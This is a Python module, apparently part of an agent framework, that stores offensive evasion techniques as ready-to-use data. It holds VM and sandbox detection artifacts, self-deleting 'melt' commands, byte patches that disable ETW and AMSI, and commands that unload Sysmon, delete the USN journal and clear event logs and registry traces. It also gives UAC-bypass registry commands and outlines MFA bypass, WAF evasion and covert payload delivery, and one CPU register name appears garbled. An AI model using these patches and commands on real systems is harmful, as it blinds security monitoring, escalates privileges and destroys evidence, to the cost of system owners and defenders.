#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from typing import List, Dict, Any

class EvasionIntelligence:
    """Intelligence engine for anti-forensics, anti-debugging, and evasion techniques."""

    @staticmethod
    def get_anti_vm_checks() -> Dict[str, Any]:
        """Extensive collection of artifacts used to detect Virtual Machines and Sandboxes."""
        return {
            "registry": {
                "vmware": [
                    r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
                    r"HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", # Identifier: VMWARE
                    r"HKLM\SYSTEM\ControlSet001\Control\SystemInformation" # SystemManufacturer: VMWARE
                ],
                "vbox": [
                    r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
                    r"HKLM\HARDWARE\ACPI\DSDT\VBOX__",
                    r"HKLM\HARDWARE\Description\System\VideoBiosVersion" # VIRTUALBOX
                ],
                "qemu": [
                    r"HKLM\HARDWARE\Description\System\SystemBiosVersion" # QEMU
                ],
                "wine": [
                    r"HKLM\SOFTWARE\Wine"
                ]
            },
            "files": [
                r"C:\Windows\system32\drivers\VBoxMouse.sys",
                r"C:\Windows\system32\drivers\VBoxGuest.sys",
                r"C:\Windows\system32\drivers\vmhgfs.sys",
                r"C:\Windows\system32\drivers\vmmouse.sys",
                r"C:\Windows\system32\drivers\vmmemctl.sys"
            ],
            "processes": [
                "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
                "prl_cc.exe", "xenservice.exe", "qemu-ga.exe", "joeboxserver.exe"
            ],
            "mac_prefixes": [
                "08:00:27", # VBox
                "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", # VMware
                "00:1C:42", # Parallels
                "00:16:3E"  # Xen
            ],
            "cpu_instructions": [
                "CPUID(0x40000000) Hypervisor Brand",
                "CPUID(0x1) ECZ bit 31 (Hypervisor Present)"
            ]
        }

    @staticmethod
    def get_self_deletion_techniques() -> Dict[str, str]:
        """Multi-method approaches for executable self-deletion (Melt)."""
        return {
            "delay_reboot": "MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)",
            "batch_melt": "@echo off\ntimeout /t 3\ndel \"%s\"\ndel \"%%~f0\"",
            "cmd_timeout": "cmd.exe /C timeout /t 2 && del \"%s\"",
            "modern_melt": "SetFileInformationByHandle(handle, FileRenameInfo, FILE_FLAG_DELETE_ON_CLOSE)",
            "schtasks": "schtasks /create /tn Melt /tr \"cmd /c del %s\" /sc once /st 00:00 /f && schtasks /run /tn Melt"
        }

    @staticmethod
    def get_etw_patching_gadgets() -> Dict[str, Any]:
        """Byte patterns for patching Event Tracing for Windows (ETW)."""
        return {
            "nttraceevent_patch": {
                "dll": "ntdll.dll",
                "function": "NtTraceEvent",
                "patch": [0xC2, 0x14, 0x00] # ret 0x14
            },
            "etw_event_write": {
                "dll": "ntdll.dll",
                "function": "EtwEventWrite",
                "patch": [0xC3] # ret
            }
        }

    @staticmethod
    def get_amsi_bypass_gadgets() -> Dict[str, Any]:
        """Techniques for bypassing Anti-Malware Scan Interface (AMSI)."""
        return {
            "amsi_scan_buffer_patch": {
                "dll": "amsi.dll",
                "function": "AmsiScanBuffer",
                "patch": [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3] # mov eax, 0x80070057; ret
            },
            "amsi_scan_buffer_patch_v2": {
                "dll": "amsi.dll",
                "function": "AmsiScanBuffer",
                "patch": [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3] # mov eax, 0; ret (EvilByte version)
            },
            "amsi_context_null": "Patching AmsiContext to NULL in memory"
        }

    @staticmethod
    def get_anti_forensics_techniques() -> Dict[str, str]:
        """Techniques to erase footprints and disrupt forensic analysis (Ported from Forensia)."""
        return {
            "sysmon_unload": "fltmc unload SysmonDrv",
            "usn_journal_disable": "fsutil usn deletejournal /D {drive}:",
            "prefetch_disable_reg": r"reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters\" /v EnablePrefetcher /t REG_DWORD /d 0 /f",
            "event_log_clear": "wevtutil cl {log_name}",
            "gutmann_shred": "35-pass overwrite with specific patterns (0x55, 0xAA, 0x92, etc.) to defeat magnetic force microscopy",
            "file_melt_nt": "Deleting the currently executing binary from disk via NTFS stream tricks or pending move rename",
            "clear_shellbags": r"reg delete \"HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU\" /f",
            "clear_shimcache": r"reg delete \"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\" /v AppCompatCache /f"
        }

    @staticmethod
    def get_waf_bypass_techniques() -> Dict[str, str]:
        """Techniques for bypassing Web Application Firewalls (Ported from FlareSolverr)."""
        return {
            "headless_browser_fingerprint_spoofing": "Overriding navigator.webdriver and other headless indicators",
            "challenge_solving_relay": "Delegating Cloudflare Turnstile/HCaptcha solving to an automated browser instance",
            "user_agent_consistency": "Ensuring TLS handshake fingerprint matches the User-Agent string",
            "proxy_rotation_geo": "Rotating IPs from the same geographic region to avoid session pinning alerts"
        }

    @staticmethod
    def get_payload_delivery_methods() -> Dict[str, str]:
        """Advanced methods for retrieving and executing payloads."""
        return {
            "stego_cert_extension": "Retrieving payload from x509 extension OID 1.2.3.4.5.6 (EXEfromCER)",
            "dns_txt_record": "Retrieving shellcode from staged DNS TXT records",
            "git_commit_messages": "Polling GitHub commit messages for encoded commands",
            "active_directory_attribute": "Executing shellcode staged in user/computer attributes (e.g., thumbnailPhoto)",
            "file_tunneling_relay": "Synchronizing remote streams via shared file locks/write-offsets (File-Tunnel)"
        }

    @staticmethod
    def get_uac_bypass_methods() -> Dict[str, str]:
        """Known UAC bypass techniques using auto-elevated binaries."""
        return {
            "fodhelper": r"reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d \"%s\" /f",
            "computerdefaults": r"reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d \"%s\" /f",
            "sdclt": r"reg add HKCU\Software\Classes\exefile\shell\runas\command /d \"%s\" /f",
            "cmstp": "Using .inf file with AdvancedInstall and CMSTP.exe",
            "ishelldispatch2": "Using Shell.Application COM object to run unelevated from elevated context"
        }

    @staticmethod
    def get_mfa_bypass_techniques() -> Dict[str, str]:
        """Techniques for bypassing multi-factor authentication (Ported from EvilGinx2)."""
        return {
            "adversary_in_the_middle_proxy": "Proxying legitimate login traffic to capture session cookies after 2FA completion",
            "push_notification_fatigue": "Bombarding the user with push notifications until they approve the request (MFA Bombing)",
            "sim_swapping": "Redirecting SMS-based 2FA codes by hijacking the victim's phone number",
            "totp_seed_theft": "Exfiltrating the TOTP shared secret from the device or server-side database",
            "session_token_theft": "Stealing active browser sessions via info-stealing malware or XSS"
        }
